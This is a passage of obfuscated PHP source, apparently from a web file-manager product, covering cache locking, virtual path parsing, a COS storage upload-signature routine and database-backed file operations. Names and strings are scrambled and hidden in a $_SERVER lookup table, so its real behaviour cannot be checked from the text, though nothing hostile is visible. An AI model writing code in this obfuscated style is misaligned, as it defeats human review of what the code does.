Cache::init(); $f²©ŠÀõÈÍ = microtime(!0) + $F•÷ëÏİô; while (microtime(!0) < $f²©ŠÀõÈÍ) { $cñ£¶ôŒèÉ = $b¦À’ÌÂˆ->get($b ©ÒŸ¥Ì); if (!$cñ£¶ôŒèÉ) { $a˜îÙÖÈ = $b¦À’ÌÂˆ->setLock($b ©ÒŸ¥Ì, $f²©ŠÀõÈÍ, $F•÷ëÏİô); if ($a˜îÙÖÈ) { return !0; } } else { if ($cñ£¶ôŒèÉ < microtime(!0)) { $b¦À’ÌÂˆ->set($b ©ÒŸ¥Ì, $f²©ŠÀõÈÍ, $F•÷ëÏİô * 2); if ($b¦À’ÌÂˆ->get($b ©ÒŸ¥Ì) === $cñ£¶ôŒèÉ) { return !0; } } } cacheLockWait(); } return !1; } public function lockGet($DÊ©Ì¼Üâº) { return Cache::init()->get($DÊ©Ì¼Üâº); } public function unlock($aõÑ„Ø‘¡¢) { return Cache::init()->remove($aõÑ„Ø‘¡¢); } } goto d‰è±¶Øï; DÄãã¬î§: class KodIO { const KOD_SOURCE = "\x7b\163\157\x75\x72\x63\145\175"; const KOD_USER_RECYCLE = "\x7b\165\163\x65\x72\122\145\143\x79\x63\x6c\x65\x7d"; const KOD_USER_FAV = "\173\165\163\x65\162\x46\x61\166\175"; const KOD_USER_FILE_TAG = "\173\165\163\145\162\x46\151\154\x65\x54\141\147\175"; const KOD_USER_FILE_TYPE = "\x7b\165\163\x65\162\106\x69\154\145\x54\x79\160\x65\175"; const KOD_GROUP_ROOT_SELF = "\x7b\x67\x72\157\165\160\x52\x6f\x6f\x74\x53\x65\154\146\175"; const KOD_USER_SHARE = "\x7b\x75\163\x65\x72\x53\x68\141\162\x65\175"; const KOD_USER_SHARE_LINK = "\173\165\x73\x65\162\123\x68\x61\162\x65\x4c\151\x6e\153\x7d"; const KOD_USER_SHARE_TO_ME = "\x7b\x73\150\x61\x72\x65\x54\157\x4d\145\x7d"; const KOD_SHARE_ITEM = "\x7b\163\150\x61\162\x65\x49\x74\145\x6d\175"; const KOD_SHARE_LINK = "\x7b\x73\x68\141\162\145\x49\x74\145\x6d\114\151\x6e\153\175"; const KOD_SEARCH = "\173\x73\145\x61\x72\x63\x68\175"; const KOD_BLOCK = "\173\142\154\x6f\x63\153\175"; const KOD_IO = "\173\x69\x6f\175"; const KOD_USER_RECENT = "\x7b\x75\x73\x65\x72\122\x65\156\143\x65\156\x74\175"; const KOD_USER_DRIVER = "\173\144\162\151\x76\145\162\175"; public static function typeList() { $a Ì±²©áÀ =& $_SERVER[Ç³Íß¦Ó]; return array($a Ì±²©áÀ[1138] => self::KOD_SOURCE, $a Ì±²©áÀ[1139] => self::KOD_USER_RECYCLE, $a Ì±²©áÀ[1140] => self::KOD_USER_FAV, $a Ì±²©áÀ[1141] => self::KOD_USER_FILE_TAG, $a Ì±²©áÀ[1142] => self::KOD_USER_FILE_TYPE, $a Ì±²©áÀ[1143] => self::KOD_GROUP_ROOT_SELF, $a Ì±²©áÀ[1144] => self::KOD_USER_SHARE, $a Ì±²©áÀ[1145] => self::KOD_USER_SHARE_LINK, $a Ì±²©áÀ[1146] => self::KOD_USER_SHARE_TO_ME, $a Ì±²©áÀ[1147] => self::KOD_SHARE_ITEM, $a Ì±²©áÀ[1148] => self::KOD_SHARE_LINK, $a Ì±²©áÀ[1149] => self::KOD_SEARCH, $a Ì±²©áÀ[1150] => self::KOD_BLOCK, $a Ì±²©áÀ[1151] => self::KOD_IO, $a Ì±²©áÀ[1152] => self::KOD_USER_RECENT, $a Ì±²©áÀ[1153] => self::KOD_USER_DRIVER); } public static function parse($dÚÂÁˆ‚ğÕ) { goto eØ³ìÅ¯©¢; DéãâËÈ¨„: $b­Çƒºà®Å = array($CØ©¾ºˆ¥Â[33], self::KOD_SOURCE, self::KOD_IO, self::KOD_SHARE_ITEM, self::KOD_SHARE_LINK, self::KOD_USER_DRIVER); $C³°êƒ¯Ûß[$CØ©¾ºˆ¥Â[1120]] = in_array($C³°êƒ¯Ûß[$CØ©¾ºˆ¥Â[29]], $b­Çƒºà®Å); return $C³°êƒ¯Ûß; goto b‡¯ÉŒŞĞ; eØ³ìÅ¯©¢: $CØ©¾ºˆ¥Â =& $_SERVER[Ç³Íß¦Ó]; $dÚÂÁˆ‚ğÕ = self::clear($dÚÂÁˆ‚ğÕ); $dè“‹åò«¯ = array_values(self::typeList()); goto Dâ½ˆá±ÈÊ; Dâ½ˆá±ÈÊ: preg_match($CØ©¾ºˆ¥Â[1154], $dÚÂÁˆ‚ğÕ, $døØô©¿¢›); $C³°êƒ¯Ûß = array($CØ©¾ºˆ¥Â[413] => !1, $CØ©¾ºˆ¥Â[1155] => !1, $CØ©¾ºˆ¥Â[410] => !1, $CØ©¾ºˆ¥Â[76] => $dÚÂÁˆ‚ğÕ, $CØ©¾ºˆ¥Â[1065] => !1, $CØ©¾ºˆ¥Â[1064] => $CØ©¾ºˆ¥Â[33]); if (is_array($døØô©¿¢›) && count($døØô©¿¢›) == 5) { $f³•¨„ºê® = $CØ©¾ºˆ¥Â[1156] . $døØô©¿¢›[2] . $CØ©¾ºˆ¥Â[324]; if (in_array($f³•¨„ºê®, $dè“‹åò«¯)) { $C³°êƒ¯Ûß[$CØ©¾ºˆ¥Â[1065]] = $døØô©¿¢›[1]; $C³°êƒ¯Ûß[$CØ©¾ºˆ¥Â[29]] = $f³•¨„ºê®; $C³°êƒ¯Ûß[$CØ©¾ºˆ¥Â[1157]] = substr($f³•¨„ºê®, 1, -1); $C³°êƒ¯Ûß[$CØ©¾ºˆ¥Â[392]] = $døØô©¿¢›[3]; } $C³°êƒ¯Ûß[$CØ©¾ºˆ¥Â[1064]] = $døØô©¿¢›[4]; } goto DéãâËÈ¨„; b‡¯ÉŒŞĞ: } public static function isTruePath($dƒ“ŠŠÂÜÇ) { goto EóÏÃĞ·; B±´¼ÅöÆ: if (strpos($dƒ“ŠŠÂÜÇ, $DÆ¢Ìµà[1123]) === 0) { return !0; } if (strpos($dƒ“ŠŠÂÜÇ, $DÆ¢Ìµà[1158]) === 0) { return !0; } if (strpos($dƒ“ŠŠÂÜÇ, $DÆ¢Ìµà[1158]) === 0) { return !0; } goto c¢Ğ‰Âà‘¸; c¢Ğ‰Âà‘¸: if (strpos($dƒ“ŠŠÂÜÇ, $DÆ¢Ìµà[1159]) === 0) { return !0; } return !1; goto Eäİ’ƒ„äÖ; EóÏÃĞ·: $DÆ¢Ìµà =& $_SERVER[Ç³Íß¦Ó]; if (substr($dƒ“ŠŠÂÜÇ, 0, 1) != $DÆ¢Ìµà[1156]) { return !0; } if (strpos($dƒ“ŠŠÂÜÇ, $DÆ¢Ìµà[399]) === 0) { return !0; } goto B±´¼ÅöÆ; Eäİ’ƒ„äÖ: } public static function clear($aÖÄ¢×±à) { goto FÈŞïÂÍìì; FÈŞïÂÍìì: $B×ßÕ †«å =& $_SERVER[Ç³Íß¦Ó]; $aÖÄ¢×±à = str_replace(array($B×ßÕ †«å[1038], $B×ßÕ †«å[228]), $B×ßÕ †«å[50], $aÖÄ¢×±à); $aÖÄ¢×±à = str_replace($B×ßÕ †«å[97], $B×ßÕ †«å[8], $aÖÄ¢×±à); goto bš™õ‚¡Í; eä‡‹·ÆšÏ: return $aÖÄ¢×±à; goto A—ëĞô„±¦; bš™õ‚¡Í: $E²ñŒ„œÛ‹ = $B×ßÕ †«å[1160]; if (substr($aÖÄ¢×±à, 0, 3) == $B×ßÕ †«å[1161]) { $aÖÄ¢×±à = substr($aÖÄ¢×±à, 3); } while (strstr($aÖÄ¢×±à, $E²ñŒ„œÛ‹)) { $aÖÄ¢×±à = str_replace($E²ñŒ„œÛ‹, $B×ßÕ †«å[8], $aÖÄ¢×±à); } goto C²–ğ¦Èå; C²–ğ¦Èå: $aÖÄ¢×±à = preg_replace($B×ßÕ †«å[1162], $B×ßÕ †«å[8], $aÖÄ¢×±à); if ($aÖÄ¢×±à == $B×ßÕ †«å[8]) { return $B×ßÕ †«å[8]; } $aÖÄ¢×±à = rtrim($aÖÄ¢×±à, $B×ßÕ †«å[8]); goto eä‡‹·ÆšÏ; A—ëĞô„±¦: } public static function sourceID($F¢Äƒ‘Œî‚) { $d½»¼–Œõñ =& $_SERVER[Ç³Íß¦Ó]; $bˆÓá·Ã¼ = self::parse($F¢Äƒ‘Œî‚); if ($bˆÓá·Ã¼[$d½»¼–Œõñ[29]] !== self::KOD_SOURCE) { show_json(LNG($d½»¼–Œõñ[1163]), !1); } return $bˆÓá·Ã¼[$d½»¼–Œõñ[392]]; } public static function make($BÆŠ£¼öÇƒ) { if (!$BÆŠ£¼öÇƒ) { return !1; } return self::makePath(self::KOD_SOURCE, intval($BÆŠ£¼öÇƒ)); } public static function makeShare($eÄ°íÚ¸÷, $e†Ïˆàºè) { return self::makePath(self::KOD_SHARE_ITEM, $eÄ°íÚ¸÷, $e†Ïˆàºè); } public static function makeFileTypePath($fß‘¨åâ±©) { return self::makePath(self::KOD_USER_FILE_TYPE, $fß‘¨åâ±©); } public static function makeFileTagPath($FñÌ‘—Û„Ó) { return self::makePath(self::KOD_USER_FILE_TAG, $FñÌ‘—Û„Ó); } public static function makePath($E«İ¡´Ú¦¿, $bÈØ”ö¤Ã = '', $BŞ‹‡é“‹é = '') { $AÕÊóãŠåĞ =& $_SERVER[Ç³Íß¦Ó]; $CÂêìÓ›Å§ = substr($E«İ¡´Ú¦¿, 1, -1); $E¸ÔßåïÚŠ = $AÕÊóãŠåĞ[1164] . $CÂêìÓ›Å§ . $AÕÊóãŠåĞ[1165] . $bÈØ”ö¤Ã . $AÕÊóãŠåĞ[1166]; $E¸ÔßåïÚŠ = $BŞ‹‡é“‹é ? $E¸ÔßåïÚŠ . $BŞ‹‡é“‹é . $AÕÊóãŠåĞ[8] : $E¸ÔßåïÚŠ; return $E¸ÔßåïÚŠ; } public static function hashPath($b”Î—“Ÿö, $D×Á³ƒŒµ³ = true) { goto bƒ¹¢š×†ğ; F½Ê‚‡Ò©Ë: return $BòÄºğ§ä; goto a¢õ–å®§; C–ÈóğÈİ¸: if (!$BòÄºğ§ä && isset($dÂœĞÄÕÏ¬[$EÆØ‘¤Ã¹[394]])) { $dÂœĞÄÕÏ¬ = IO::info(KodIO::make($dÂœĞÄÕÏ¬[$EÆØ‘¤Ã¹[394]])); $BòÄºğ§ä = _get($dÂœĞÄÕÏ¬, $EÆØ‘¤Ã¹[1167], $EÆØ‘¤Ã¹[33]); } if (!$BòÄºğ§ä && $D×Á³ƒŒµ³) { $Fœ±«¯İßÄ = KodIO::parse($dÂœĞÄÕÏ¬[$EÆØ‘¤Ã¹[76]]); if (!$Fœ±«¯İßÄ[$EÆØ‘¤Ã¹[29]]) { $BòÄºğ§ä = IO::hashSimple($dÂœĞÄÕÏ¬[$EÆØ‘¤Ã¹[76]]); } } if (!$BòÄºğ§ä) { $BòÄºğ§ä = md5($dÂœĞÄÕÏ¬[$EÆØ‘¤Ã¹[76]] . $dÂœĞÄÕÏ¬[$EÆØ‘¤Ã¹[78]] . $dÂœĞÄÕÏ¬[$EÆØ‘¤Ã¹[84]]); } goto F½Ê‚‡Ò©Ë; bƒ¹¢š×†ğ: $EÆØ‘¤Ã¹ =& $_SERVER[Ç³Íß¦Ó]; $dÂœĞÄÕÏ¬ = is_array($b”Î—“Ÿö) ? $b”Î—“Ÿö : IO::info($b”Î—“Ÿö); $BòÄºğ§ä = _get($dÂœĞÄÕÏ¬, $EÆØ‘¤Ã¹[1167], $EÆØ‘¤Ã¹[33]); goto C–ÈóğÈİ¸; a¢õ–å®§: } public static function initSystemPath() { goto c•ô¥èôæÅ; eî¦˜Öõ„Ê: IOHistory::bindEvent(); goto f·Ù¸ˆ×°­; a‹’™ËÕ·¼: define($b½ãÜÇïˆ‚[1170], self::systemPath($b½ãÜÇïˆ‚[1171])); define($b½ãÜÇïˆ‚[1172], self::systemPath($b½ãÜÇïˆ‚[1173])); define($b½ãÜÇïˆ‚[1174], self::systemPath($b½ãÜÇïˆ‚[1175])); goto eî¦˜Öõ„Ê; c•ô¥èôæÅ: $b½ãÜÇïˆ‚ =& $_SERVER[Ç³Íß¦Ó]; if (defined($b½ãÜÇïˆ‚[1168])) { return; } define($b½ãÜÇïˆ‚[1168], self::systemPath($b½ãÜÇïˆ‚[1169])); goto a‹’™ËÕ·¼; f·Ù¸ˆ×°­: } public static function systemPath($B®¢â‰šíö) { goto CÔäñõÄËĞ; CÔäñõÄËĞ: $fÓÅ¼„Ş¡ù =& $_SERVER[Ç³Íß¦Ó]; $A­ßÒªñ´Ó = $fÓÅ¼„Ş¡ù[1176] . ucfirst($B®¢â‰šíö); $C¥²¦½§ï“ = Model($fÓÅ¼„Ş¡ù[731])->get($A­ßÒªñ´Ó); goto dŞ‰†åÏœÑ; dŞ‰†åÏœÑ: if ($C¥²¦½§ï“) { return $C¥²¦½§ï“; } if ($B®¢â‰šíö == $fÓÅ¼„Ş¡ù[1169]) { $C¥²¦½§ï“ = self::make(Model($fÓÅ¼„Ş¡ù[791])->systemRootPathAdd($fÓÅ¼„Ş¡ù[504])); } else { $C¥²¦½§ï“ = self::systemPath($fÓÅ¼„Ş¡ù[1169]); $BòƒËĞ„•½ = self::sourceID($C¥²¦½§ï“); $C¥²¦½§ï“ = self::make(Model($fÓÅ¼„Ş¡ù[791])->mkdir($BòƒËĞ„•½, $B®¢â‰šíö)); } Model($fÓÅ¼„Ş¡ù[731])->set($A­ßÒªñ´Ó, $C¥²¦½§ï“); goto Aµé‹Â¡ğ¾; Aµé‹Â¡ğ¾: return $C¥²¦½§ï“; goto DÌã°Õ®±; DÌã°Õ®±: } public static function systemFolder($Fİ‹Ôóé±) { $d‘¥¬ºò”± = IO_PATH_SYSTEM_SOURCE . $Fİ‹Ôóé±; $eÁ†·ÀçÏ = Cache::get($d‘¥¬ºò”±); if (!$eÁ†·ÀçÏ) { $bÏÓÓ·«é = IO::infoFull($d‘¥¬ºò”±); if (!$bÏÓÓ·«é) { $eÁ†·ÀçÏ = IO::mkdir($d‘¥¬ºò”±, REPEAT_SKIP); } else { $eÁ†·ÀçÏ = $bÏÓÓ·«é[$_SERVER[Ç³Íß¦Ó][76]]; } Cache::set($d‘¥¬ºò”±, $eÁ†·ÀçÏ, 3600 * 10); } return $eÁ†·ÀçÏ; } public static function defaultDriver() { return Model($_SERVER[Ç³Íß¦Ó][728])->defaultDriver(); } public static function defaultIO() { $D‹¢Ó¼¿ˆÁ =& $_SERVER[Ç³Íß¦Ó]; $b¾ô«ÒÒˆ = self::defaultDriver(); return $D‹¢Ó¼¿ˆÁ[1177] . $b¾ô«ÒÒˆ[$D‹¢Ó¼¿ˆÁ[392]] . $D‹¢Ó¼¿ˆÁ[1166]; } public static function defaultDriverInit() { static $fĞÂ½Èªù = false; if ($fĞÂ½Èªù) { return $fĞÂ½Èªù; } $fĞÂ½Èªù = IO::init(self::defaultIO()); return $fĞÂ½Èªù; } public static function fileTypeList() { $Aİ½ƒì÷Š =& $_SERVER[Ç³Íß¦Ó]; $bÏ²²Ù˜• = $GLOBALS[$Aİ½ƒì÷Š[6]][$Aİ½ƒì÷Š[1178]]; foreach ($bÏ²²Ù˜• as $a…ìŠ”ÒÜá => $C‰ß¢–ÜÕñ) { $B‰…¥óåƒõ = $Aİ½ƒì÷Š[1179] . $a…ìŠ”ÒÜá; $FÛ‰Ñ³…à = LNG($B‰…¥óåƒõ); if ($B‰…¥óåƒõ != $FÛ‰Ñ³…à) { $bÏ²²Ù˜•[$a…ìŠ”ÒÜá][$Aİ½ƒì÷Š[28]] = $FÛ‰Ñ³…à; } } return $bÏ²²Ù˜•; } public static function transferType($f‡«¯Õƒèœ, $EÕ×¥‚ìó) { goto eäÓìİÖ; D¿½šõ³˜: if ($Båí­‰³›·[$b²ã´øªä²[29]] == $d˜ÜêÊ‡ğ[$b²ã´øªä²[29]] && $Båí­‰³›·[$b²ã´øªä²[1180]] == $d˜ÜêÊ‡ğ[$b²ã´øªä²[1180]]) { return $b²ã´øªä²[1181]; } if ($Båí­‰³›·[$b²ã´øªä²[29]] == $b²ã´øªä²[824] && $d˜ÜêÊ‡ğ[$b²ã´øªä²[29]] == $b²ã´øªä²[106]) { return $b²ã´øªä²[1094]; } if ($Båí­‰³›·[$b²ã´øªä²[29]] == $b²ã´øªä²[106] && $d˜ÜêÊ‡ğ[$b²ã´øªä²[29]] == $b²ã´øªä²[824]) { return $b²ã´øªä²[107]; } goto còêÕ¯Öî™; eäÓìİÖ: $b²ã´øªä² =& $_SERVER[Ç³Íß¦Ó]; $Båí­‰³›· = self::driverType($f‡«¯Õƒèœ); $d˜ÜêÊ‡ğ = self::driverType($EÕ×¥‚ìó); goto D¿½šõ³˜; còêÕ¯Öî™: return $b²ã´øªä²[1182]; goto A¸õºÊÔ¹µ; A¸õºÊÔ¹µ: } public static function driverType($dØŠ©Ëä„¸) { goto bÑñöÇ´±®; dïØªñ‡µ: return array($Eøñ¼ô‡Œ²[29] => $Eøñ¼ô‡Œ²[824], $Eøñ¼ô‡Œ²[1180] => $dØŠ©Ëä„¸->pathDriver, $Eøñ¼ô‡Œ²[76] => $A¤£å¥¶Ç°); goto Cã†ë¬÷; e…‡‘ğ½: if ($AŸèœÓî¨³ == $Eøñ¼ô‡Œ²[719] || $AŸèœÓî¨³ == $Eøñ¼ô‡Œ²[1184] || $AŸèœÓî¨³ == $Eøñ¼ô‡Œ²[1185]) { $dØŠ©Ëä„¸ = self::defaultDriverInit(); } else { if ($AŸèœÓî¨³ == $Eøñ¼ô‡Œ²[1101] || $AŸèœÓî¨³ == $Eøñ¼ô‡Œ²[1186]) { $dØŠ©Ëä„¸ = IO::init($dØŠ©Ëä„¸->pathParse[$Eøñ¼ô‡Œ²[1048]]); } } $AŸèœÓî¨³ = str_replace($Eøñ¼ô‡Œ²[1183], $Eøñ¼ô‡Œ²[33], strtolower($dØŠ©Ëä„¸->getType())); if ($AŸèœÓî¨³ == $Eøñ¼ô‡Œ²[106]) { return array($Eøñ¼ô‡Œ²[29] => $Eøñ¼ô‡Œ²[106], $Eøñ¼ô‡Œ²[1180] => $Eøñ¼ô‡Œ²[33], $Eøñ¼ô‡Œ²[76] => $A¤£å¥¶Ç°); } goto dïØªñ‡µ; bÑñöÇ´±®: $Eøñ¼ô‡Œ² =& $_SERVER[Ç³Íß¦Ó]; $A¤£å¥¶Ç° = $dØŠ©Ëä„¸->path; $AŸèœÓî¨³ = str_replace($Eøñ¼ô‡Œ²[1183], $Eøñ¼ô‡Œ²[33], strtolower($dØŠ©Ëä„¸->getType())); goto e…‡‘ğ½; Cã†ë¬÷: } } class PathDriverCOS extends PathDriverBaseS3 { public function __construct($cÜ§Ûˆ¥) { parent::__construct($cÜ§Ûˆ¥); $this->signatureVersion($_SERVER[Ç³Íß¦Ó][211]); } public function uploadFormData($cÛ„Á‰í, $fªéß­Í¦É = 3600) { goto D—¯é³¥¬¡; FŞØÃ‡éæÒ: return $aĞé´ÀïÒ; goto F·Ÿ»ÓÎ÷˜; CÓ÷¬ğù: $f‰é³Œ‚¹ = sha1($DïÁ²Ò£Šï); $E„Õ¥ìªˆ = hash_hmac($A“„îã… ğ[229], $f‰é³Œ‚¹, $FÚ³·ˆíî); $aĞé´ÀïÒ = array($A“„îã… ğ[1191] => $AŸÚÀòóˆµ, $A“„îã… ğ[1195] => $e±ÅŠÉï÷¯, $A“„îã… ğ[1199] => base64_encode($DïÁ²Ò£Šï), $A“„îã… ğ[1196] => $f­ŒæŸ”Ô, $A“„îã… ğ[1197] => $this->accessKey, $A“„îã… ğ[1200] => $aÈô£µÉìŠ, $A“„îã… ğ[1201] => $E„Õ¥ìªˆ, $A“„îã… ğ[175] => $this->getHost()); goto FŞØÃ‡éæÒ; D—¯é³¥¬¡: $A“„îã… ğ =& $_SERVER[Ç³Íß¦Ó]; $AŸÚÀòóˆµ = $A“„îã… ğ[191]; $f­ŒæŸ”Ô = $A“„îã… ğ[229]; goto FåÉì½š; FåÉì½š: $e±ÅŠÉï÷¯ = $A“„îã… ğ[1187]; $b·˜Ğó‹®Ñ = gmdate($A“„îã… ğ[1188], time() + $fªéß­Í¦É); $aÈô£µÉìŠ = (string) time() . $A“„îã… ğ[68] . (string) (time() + $fªéß­Í¦É); goto cìÒåïÔ“; cìÒåïÔ“: $DïÁ²Ò£Šï = array($A“„îã… ğ[1189] => $b·˜Ğó‹®Ñ, $A“„îã… ğ[1190] => array(array($A“„îã… ğ[1191] => $AŸÚÀòóˆµ), array($A“„îã… ğ[1192] => $this->bucket), array($A“„îã… ğ[1193], $A“„îã… ğ[1194], $A“„îã… ğ[33]), array($A“„îã… ğ[1195] => $e±ÅŠÉï÷¯), array($A“„îã… ğ[1196] => $f­ŒæŸ”Ô), array($A“„îã… ğ[1197] => $this->accessKey), array($A“„îã… ğ[1198] => $aÈô£µÉìŠ))); $DïÁ²Ò£Šï = json_encode($DïÁ²Ò£Šï); $FÚ³·ˆíî = hash_hmac($A“„îã… ğ[229], $aÈô£µÉìŠ, $this->secret); goto CÓ÷¬ğù; F·Ÿ»ÓÎ÷˜: } public function fileOutLink($cë˜Œñ²Ÿ²) { $bÈ·ìùÈ¥‹ =& $_SERVER[Ç³Íß¦Ó]; if (substr($cë˜Œñ²Ÿ², 0, 7) == $bÈ·ìùÈ¥‹[1202]) { $cë˜Œñ²Ÿ² = $bÈ·ìùÈ¥‹[1203] . substr($cë˜Œñ²Ÿ², 7); } header($bÈ·ìùÈ¥‹[159] . $cë˜Œñ²Ÿ²); die; } } class PathDriverDB extends PathDriverBase { public $model; public $pathParse; public function __construct($Ešª½Ù†«Ò) { $this->pathParse = $Ešª½Ù†«Ò; $this->model = Model($_SERVER[Ç³Íß¦Ó][1204]); } public function getPath($A…‚ÈªÙ†´) { return trim($A…‚ÈªÙ†´, $_SERVER[Ç³Íß¦Ó][8]); } public function pathFather($aÑÜÜÇÇªŸ) { $FÖĞôºÌÎ¶ = $this->parse($aÑÜÜÇÇªŸ); $FÖĞôºÌÎ¶ = $this->infoSimple($aÑÜÜÇÇªŸ); return $FÖĞôºÌÎ¶ ? $FÖĞôºÌÎ¶[$_SERVER[Ç³Íß¦Ó][476]] : !1; } public function pathThis($bÃÉä˜‹º) { $FìŒ«¨Éé¸ = $this->infoSimple($bÃÉä˜‹º); return $FìŒ«¨Éé¸ ? $FìŒ«¨Éé¸[$_SERVER[Ç³Íß¦Ó][28]] : !1; } public function getPathOuter($BÓ¸»‘›) { if (!$BÓ¸»‘›) { return $BÓ¸»‘›; } $CáÓòØ †æ = $this->parse($BÓ¸»‘›); return KodIO::make($CáÓòØ †æ[$_SERVER[Ç³Íß¦Ó][392]]); } public function copyFolderFromIO($B•§ïĞä–, $f¶–Ó½ŸíÎ, $b¦‘Šƒ­ƒ, $F¯£†Õ¦Å—, $Cœ˜š¥ÎŠç) { $BÓ¬–Â™…³ = $this->model->copyFolderFromIO($B•§ïĞä–, $f¶–Ó½ŸíÎ, $b¦‘Šƒ­ƒ, $F¯£†Õ¦Å—, $Cœ˜š¥ÎŠç); return KodIO::make($BÓ¬–Â™…³); } public function isParentOf($CÕ‘¶çë÷ˆ, $D—¹÷ÔÎ) { return $this->model->isParentOf($CÕ‘¶çë÷ˆ, $D—¹÷ÔÎ); } public function mkfile($FĞÕ±„°ä§, $AÇ¸×‰—ŞÌ = '', $E‹Ş–Ò›Ì = REPEAT_RENAME) { $fÈ¨ŠÕ»äÖ =& $_SERVER[Ç³Íß¦Ó]; $c ·ƒÓù­â = $this->parse($FĞÕ±„°ä§); $FĞÕ±„°ä§ = $c ·ƒÓù­â[$fÈ¨ŠÕ»äÖ[392]]; for ($fÑ˜Ğ¥à—³ = 0; $fÑ˜Ğ¥à—³ < count($c ·ƒÓù­â[$fÈ¨ŠÕ»äÖ[1205]]); $fÑ˜Ğ¥à—³++) { $aÑÎ§ÆÁÊ = $c ·ƒÓù­â[$fÈ¨ŠÕ»äÖ[1205]][$fÑ˜Ğ¥à—³]; if ($fÑ˜Ğ¥à—³ == count($c ·ƒÓù­â[$fÈ¨ŠÕ»äÖ[1205]]) - 1) { $FĞÕ±„°ä§ = $this->model->mkfile($FĞÕ±„°ä§, $aÑÎ§ÆÁÊ, $AÇ¸×‰—ŞÌ, $E‹Ş–Ò›Ì); break; } $FĞÕ±„°ä§ = $this->model->mkdir($FĞÕ±„°ä§, $aÑÎ§ÆÁÊ, REPEAT_SKIP); } return $this->getPathOuter($FĞÕ±„°ä§); } public function mkdir($aî¤¶«, $F¥º‰¤çÓ = REPEAT_SKIP) { $aÒêªÚ·àİ =& $_SERVER[Ç³Íß¦Ó]; $aÁà˜ª¿ØÌ = $this->parse($aî¤¶«); $aî¤¶« = $aÁà˜ª¿ØÌ[$aÒêªÚ·àİ[392]]; for ($DŒ„ˆÇæ™Š = 0; $DŒ„ˆÇæ™Š < count($aÁà˜ª¿ØÌ[$aÒêªÚ·àİ[1205]]); $DŒ„ˆÇæ™Š++) { $a’‹ÇÎ„­Ì = $aÁà˜ª¿ØÌ[$aÒêªÚ·àİ[1205]][$DŒ„ˆÇæ™Š]; $aî¤¶« = $this->model->mkdir($aî¤¶«, $a’‹ÇÎ„­Ì, $F¥º‰¤çÓ); } return $this->getPathOuter($aî¤¶«); } public function copyFile($CÂ„¬º‘›š, $A’øÊÅÇ, $c»—Ò‹˜‘ò = REPEAT_REPLACE) { $bñË¿¯¨ÇÏ =& $_SERVER[Ç³Íß¦Ó]; $b¾óÁ÷ÊÛÓ = $this->parse($A’øÊÅÇ); $cŸ†ÅÃÍßÆ = $this->model->copy($CÂ„¬º‘›š, $b¾óÁ÷ÊÛÓ[$bñË¿¯¨ÇÏ[392]], $c»—Ò‹˜‘ò, $b¾óÁ÷ÊÛÓ[$bñË¿¯¨ÇÏ[76]]); return $cŸ†ÅÃÍßÆ ? $this->getPathOuter($cŸ†ÅÃÍßÆ) : !1; } public function moveFile($AÉŸ©¬ÆÕË, $fÆ©²†‚ƒÀ, $F…­‡Í±š = REPEAT_REPLACE) { $e–øÃÃµé =& $_SERVER[Ç³Íß¦Ó]; $cë“‘µ¤øğ = $this->parse($fÆ©²†‚ƒÀ); $C…Í­„›º  = $this->model->move($AÉŸ©¬ÆÕË, $cë“‘µ¤øğ[$e–øÃÃµé[392]], $F…­‡Í±š, $cë“‘µ¤øğ[$e–øÃÃµé[76]]); return $C…Í­„›º  ? $this->getPathOuter($C…Í­„›º ) : !1; } public function copy($a›Ğğ‹Ú´‹, $E£ï‰šÉì¢, $D•š‚ë£Ã´ = REPEAT_REPLACE) { $FíÄ¤À™ê = $this->parse($E£ï‰šÉì¢); $dïïÑàø±Ì = $this->model->copy($a›Ğğ‹Ú´‹, $FíÄ¤À™ê[$_SERVER[Ç³Íß¦Ó][392]], $D•š‚ë£Ã´); return $dïïÑàø±Ì ? $this->getPathOuter($dïïÑàø±Ì) : !1; } public function moveSameAllow() { } public function move($bô‰ßàÕè, $B·ØŠ©à¶¬, $céãë¸ãó¢ = REPEAT_REPLACE) { $Bò§ó‘¬Ñ = $this->parse($B·ØŠ©à¶¬); $A»ÉÈ™½±‹ = $this->model->move($bô‰ßàÕè, $Bò§ó‘¬Ñ[$_SERVER[Ç³Íß¦Ó][392]], $céãë¸ãó¢); return $A»ÉÈ™½±‹ ? $this->getPathOuter($A»ÉÈ™½±‹) : !1; } public function remove($Dè½´µƒ²ø, $aÁ÷ôÒ–ß¦ = true) { return $this->model->remove($Dè½´µƒ²ø, $aÁ÷ôÒ–ß¦); } public function rename($FšŒ‚±Ñ¡¼, $eëœŸ˜ÉÕÙ) { $d¥çƒÕÀŞ˜ = $this->model->rename($FšŒ‚±Ñ¡¼, $eëœŸ˜ÉÕÙ); return $d¥çƒÕÀŞ˜ ? $this->getPathOuter($FšŒ‚±Ñ¡¼) : $d¥çƒÕÀŞ˜; } public function size($D¦‰©°Ø¥) { $CÊóÕòŠó† = $this->infoSimple($D¦‰©°Ø¥); return $CÊóÕòŠó† ? $CÊóÕòŠó†[$_SERVER[Ç³Íß¦Ó][78]] : 0; } public function infoSimple($c½¬Éó½ÜÁ) { return $this->model->sourceInfo($c½¬Éó½ÜÁ); } public function info($cª¿ŒÌŒİ) { return $this->infoParse($cª¿ŒÌŒİ); } public function infoAuth($båÙòˆÕä) { return $this->infoParse($båÙòˆÕä, !1, !0); } public function infoWithChildren($Cä–¢ß‘‚¬) { return $this->infoParse($Cä–¢ß‘‚¬, !0); } protected function infoParse($fÓ‰ä¨á½ñ, $b±ŒÑÖÊšÈ = false, $AÊ£¢Ú¼ä = false) { if (!$b±ŒÑÖÊšÈ) { return $this->model->pathInfo($fÓ‰ä¨á½ñ, $AÊ£¢Ú¼ä); } return $this->model->pathInfoMore($fÓ‰ä¨á½ñ); } public function infoFull($a±‰š‰ÜœÖ) { $dÙù“·òÓµ =& $_SERVER[Ç³Íß¦Ó]; $C±ãè¨äÍ = explode($dÙù“·òÓµ[8], $a±‰š‰ÜœÖ); $Dİ×§÷­ã = implode($dÙù“·òÓµ[8], array_splice($C±ãè¨äÍ, 1)); return $this->model->pathInfoByPath($C±ãè¨äÍ[0], $Dİ×§÷­ã); } public function hashSimple($f‘Ôõ™ÂÛ‘) { $EåÆŒã­è´ =& $_SERVER[Ç³Íß¦Ó]; $fÇ†ªŒ‘Ì… = $this->infoWithChildren($f‘Ôõ™ÂÛ‘); return $fÇ†ªŒ‘Ì…[$EåÆŒã­è´[164]][$EåÆŒã­è´[171]]; } public function hashMd5($Fç„°Ø¯Í) { $B¾Á´×„¡© =& $_SERVER[Ç³Íß¦Ó]; $d¤ÑÂ‚ˆ„± = $this->infoWithChildren($Fç„°Ø¯Í); return 